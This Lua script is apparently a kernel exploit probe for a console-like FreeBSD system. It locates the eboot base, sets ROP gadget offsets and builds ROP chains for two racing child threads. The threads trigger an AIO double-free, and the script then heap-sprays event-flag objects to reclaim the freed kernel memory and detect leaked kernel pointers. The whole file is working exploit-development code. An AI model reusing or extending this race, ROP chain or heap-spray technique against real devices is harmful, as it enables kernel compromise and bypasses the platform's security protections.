-- CRASH_CLASS: MODERATE
-- PROBE 69r: High-volume EVF spray after AIO double-free
--
-- Context: Previous spray probes used only ~200 objects. UMA zone per-CPU
-- caches can hold 4K-16K items before draining to the slab allocator.
-- The R object (48B) rounds to the 64-byte zone bucket. EVF objects
-- (via 538 evf_create) also allocate from kernel heap and may land in
-- the same zone if sized similarly.
--
-- Strategy:
-- 1. Trigger the 65l-style double-free (2 children + gated 662)
-- 2. Spray 4096 EVF objects (538 calls) with distinct sentinel bits
-- 3. Read back all EVF objects via 543/542 to detect:
--    a. Kernel pointer contamination (R+0x00/R+0x08 curthread values)
--    b. Sentinel corruption (another EVF's bits overwriting freed slot)
-- 4. Also try 557 namedobj spray (48B name → may match R object zone)

print("=== PROBE 69r: HIGH-VOLUME EVF SPRAY AFTER DOUBLE-FREE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL"); return end

-- ============================================================
-- AIO HELPERS
-- ============================================================
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function submit_one()
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0)); wq(N(reqs) + 8, uint64(16))
    wq(N(reqs) + 0x10, uint64(N(data_buf)))
    wq(N(reqs) + 0x18, uint64(N(result_buf)))
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)
    pcall(function() mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_buf))) end)
    return rd(N(id_buf)) or 0
end

local function poll_one(id)
    local pb = memory.alloc(8); local sb = memory.alloc(8)
    wd(N(pb), id); wd(N(sb), 0)
    pcall(function() mk(664)(uint64(N(pb)), uint64(1), uint64(N(sb))) end)
end

-- ============================================================
-- GATE + CHILD SETUP (same as 69e pattern)
-- ============================================================
local function make_gate()
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    return rd(N(sp)) or -1, rd(N(sp) + 4) or -1
end

local gate_a_r, gate_a_w = make_gate()
local gate_b_r, gate_b_w = make_gate()
print(string.format("gates: A=%d/%d B=%d/%d", gate_a_r, gate_a_w, gate_b_r, gate_b_w))
if gate_a_r < 0 or gate_b_r < 0 then print("GATE FAIL"); return end

local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_rd = memory.alloc(8)
local wbyte = memory.alloc(8); wd(N(wbyte), 0x42)
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end

-- ============================================================
-- [A] Baseline: how many EVFs can we create?
-- ============================================================
print("")
print("[A] EVF budget test")

local test_handles = {}
local MAX_TEST = 500
for i = 1, MAX_TEST do
    local name = put_str(string.format("tst%04d", i))
    local ret = -1
    pcall(function() ret = sgn(mk(538)(uint64(N(name)), uint64(0))) end)
    if ret < 0 then
        print(string.format("  EVF budget: %d (failed at %d, ret=%d)", i - 1, i, ret))
        break
    end
    test_handles[#test_handles + 1] = ret
    if i == MAX_TEST then
        print(string.format("  EVF budget: >= %d", MAX_TEST))
    end
end

-- Clean up test EVFs
for _, h in ipairs(test_handles) do
    pcall(function() mk(539)(uint64(h)) end)
end
print(string.format("  cleaned %d test EVFs", #test_handles))

if not alive() then print("DEAD after budget test"); return end

-- ============================================================
-- [B] sys 624 baseline
-- ============================================================
local s624 = mk(624)
local base_624 = N(s624())
print(string.format("[B] sys 624 baseline: %d", base_624))

-- ============================================================
-- [C] DOUBLE-FREE + HIGH-VOLUME SPRAY
-- ============================================================
print("")
print("[C] Double-free + EVF spray")

local BATCH = 16
local SPRAY_COUNT = math.min(#test_handles, 400)  -- use measured budget
print(string.format("  BATCH=%d SPRAY_COUNT=%d", BATCH, SPRAY_COUNT))

-- Submit + poll BATCH AIO requests
local ids = {}
for i = 1, BATCH do
    local id = submit_one()
    if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
end
if #ids < BATCH then print("  submit short: " .. #ids); return end

-- Shared delete arrays
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
for i = 0, BATCH - 1 do
    wd(N(del_ids) + i * 4, ids[i + 1])
    wd(N(states_A) + i * 4, 0xAA)
    wd(N(states_B) + i * 4, 0xBB)
end
wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

-- Build child A ROP: sysarch + marker + gate + 662 + exit
local stk_A = memory.alloc(0x4000)
local tcb_ptr = memory.alloc(8); wq(N(tcb_ptr), uint64(N(fake_tcb)))
do
    local sb = N(stk_A)
    for i = 0, 0x3FFC, 4 do wd(sb + i, 0) end
    local sp = ((sb + 0x4000) - ((sb + 0x4000) % 16)) - 8
    local o = 0
    local function p(v) wq(sp + o, v); o = o + 8 end
    p(g_pop_rax); p(uint64(165)); p(g_pop_rdi); p(uint64(129))
    p(g_pop_rsi); p(uint64(N(tcb_ptr))); p(stub)
    p(g_pop_rax); p(uint64(0xAA00)); p(g_pop_rdi); p(uint64(N(marker_A))); p(g_mov_m_rax)
    p(g_pop_rax); p(uint64(3)); p(g_pop_rdi); p(uint64(gate_a_r))
    p(g_pop_rsi); p(uint64(N(tmp_rd))); p(g_pop_rdx); p(uint64(1)); p(stub)
    p(g_pop_rdi); p(uint64(N(del_ids))); p(g_pop_rsi); p(uint64(BATCH))
    p(g_pop_rdx); p(uint64(N(states_A))); p(g_pop_rax); p(uint64(662)); p(stub)
    p(g_pop_rdi); p(uint64(0)); p(g_pop_rax); p(uint64(431)); p(stub)
end

-- Build child B ROP (same but gate B)
local stk_B = memory.alloc(0x4000)
do
    local sb = N(stk_B)
    for i = 0, 0x3FFC, 4 do wd(sb + i, 0) end
    local sp = ((sb + 0x4000) - ((sb + 0x4000) % 16)) - 8
    local o = 0
    local function p(v) wq(sp + o, v); o = o + 8 end
    p(g_pop_rax); p(uint64(165)); p(g_pop_rdi); p(uint64(129))
    p(g_pop_rsi); p(uint64(N(tcb_ptr))); p(stub)
    p(g_pop_rax); p(uint64(0xBB00)); p(g_pop_rdi); p(uint64(N(marker_B))); p(g_mov_m_rax)
    p(g_pop_rax); p(uint64(3)); p(g_pop_rdi); p(uint64(gate_b_r))
    p(g_pop_rsi); p(uint64(N(tmp_rd))); p(g_pop_rdx); p(uint64(1)); p(stub)
    p(g_pop_rdi); p(uint64(N(del_ids))); p(g_pop_rsi); p(uint64(BATCH))
    p(g_pop_rdx); p(uint64(N(states_B))); p(g_pop_rax); p(uint64(662)); p(stub)
    p(g_pop_rdi); p(uint64(0)); p(g_pop_rax); p(uint64(431)); p(stub)
end

-- Spawn children
local function spawn(stk, sz)
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
    wq(N(pa), g_bare_ret); wq(N(pa) + 0x10, uint64(N(stk))); wq(N(pa) + 0x18, uint64(sz))
    pcall(function() mk(455)(pa, uint64(0x38)) end)
end

spawn(stk_A, 0x4000)
spawn(stk_B, 0x4000)

-- Wait markers
local rdy_a, rdy_b = false, false
for w = 1, 500000 do
    if not rdy_a then local v = rq(N(marker_A)); if v and N(v) ~= 0 then rdy_a = true end end
    if not rdy_b then local v = rq(N(marker_B)); if v and N(v) ~= 0 then rdy_b = true end end
    if rdy_a and rdy_b then break end
end
if not (rdy_a and rdy_b) then print("  MARKER TIMEOUT"); return end

-- Fire gates simultaneously
for d = 1, 200 do end
pcall(function() mk(4)(uint64(gate_a_w), uint64(N(wbyte)), uint64(1)) end)
pcall(function() mk(4)(uint64(gate_b_w), uint64(N(wbyte)), uint64(1)) end)

-- Wait completion
for w = 1, 200000 do end

-- Count doubles
local doubles = 0
for i = 0, BATCH - 1 do
    local sA = rd(N(states_A) + i * 4) or 0xAA
    local sB = rd(N(states_B) + i * 4) or 0xBB
    if sA == 0 and sB == 0 then doubles = doubles + 1 end
end
print(string.format("  doubles: %d / %d", doubles, BATCH))

local post_624 = N(s624())
print(string.format("  624 after race: %d (delta=%d)", post_624, post_624 - base_624))

if not alive() then print("DEAD after race"); return end

-- ============================================================
-- [D] HIGH-VOLUME EVF SPRAY
-- ============================================================
print("")
print(string.format("[D] Spraying %d EVF objects...", SPRAY_COUNT))

local evf_handles = {}
local evf_bits = {}
for i = 1, SPRAY_COUNT do
    if not alive() then break end
    local sentinel = 0xCAFE0000 + i
    local name = put_str(string.format("ev%05d", i))
    local ret = -1
    pcall(function() ret = sgn(mk(538)(uint64(N(name)), uint64(sentinel))) end)
    if ret >= 0 then
        evf_handles[#evf_handles + 1] = ret
        evf_bits[#evf_bits + 1] = sentinel
    end
    if i % 100 == 0 then
        print(string.format("  sprayed %d/%d (ok=%d)", i, SPRAY_COUNT, #evf_handles))
    end
end
print(string.format("  total sprayed: %d", #evf_handles))

local spray_624 = N(s624())
print(string.format("  624 after spray: %d (delta from race=%d)", spray_624, spray_624 - post_624))

-- ============================================================
-- [E] READBACK: check all EVF objects for contamination
-- ============================================================
print("")
print("[E] Reading back EVF objects...")

local kptr_count = 0
local corrupt_count = 0
local anomalies = {}

for i, h in ipairs(evf_handles) do
    if not alive() then break end

    -- 543(handle, bits, mode) — trywait, returns 0 if bits are set
    local tw_ret = -1
    pcall(function() tw_ret = sgn(mk(543)(uint64(h), uint64(evf_bits[i]), uint64(0))) end)

    -- 542(handle, bits, mode, result_ptr, timeout) — wait with result
    local rbuf = memory.alloc(8)
    wq(N(rbuf), uint64(0xDEADDEAD))
    local w_ret = -1
    pcall(function()
        w_ret = sgn(mk(542)(uint64(h), uint64(evf_bits[i]), uint64(0), uint64(N(rbuf)), uint64(0)))
    end)
    local result_val = rq(N(rbuf))
    local rh, rl = get_hi_lo(result_val)

    -- Check for kernel pointers in the result
    if rh >= 0xFFFF8000 and rh ~= 0xFFFFFFFF then
        kptr_count = kptr_count + 1
        table.insert(anomalies, string.format(
            "  *** KPTR evf[%d] h=0x%X: result=%s ***", i, h, fmt(result_val)))
    end

    -- Check if bits were corrupted (different from what we set)
    if tw_ret == 0 and w_ret == 0 then
        -- Bits matched — normal
    elseif tw_ret ~= 0 then
        -- Bits not set — something corrupted them
        corrupt_count = corrupt_count + 1
        if #anomalies < 50 then
            table.insert(anomalies, string.format(
                "  CORRUPT evf[%d] h=0x%X: trywait=%d wait=%d result=%s expected_bits=0x%X",
                i, h, tw_ret, w_ret, fmt(result_val), evf_bits[i]))
        end
    end

    if i % 100 == 0 then
        print(string.format("  checked %d/%d kptr=%d corrupt=%d",
            i, #evf_handles, kptr_count, corrupt_count))
    end
end

-- Print anomalies
if #anomalies > 0 then
    print("")
    print("=== ANOMALIES ===")
    for _, a in ipairs(anomalies) do print(a) end
end

-- ============================================================
-- CLEANUP
-- ============================================================
print("")
print("[F] Cleanup")
local cleaned = 0
for _, h in ipairs(evf_handles) do
    pcall(function() mk(539)(uint64(h)) end)
    cleaned = cleaned + 1
end
print(string.format("  cleaned %d EVFs", cleaned))

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print(string.format("RESULTS: doubles=%d, sprayed=%d, kptr=%d, corrupt=%d",
    doubles, #evf_handles, kptr_count, corrupt_count))
if kptr_count > 0 then
    print("*** KERNEL POINTER LEAKED THROUGH EVF READBACK ***")
    print("*** R+0x00/R+0x08 curthread values survived into reclaimed EVF ***")
elseif corrupt_count > 0 then
    print("*** EVF SENTINEL CORRUPTION DETECTED ***")
    print("*** Freed R object slot was reclaimed — overlapping kernel data ***")
else
    print("No contamination detected at this spray volume.")
    print("May need: higher count, different timing, or namedobj spray.")
end
print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69r COMPLETE ===")
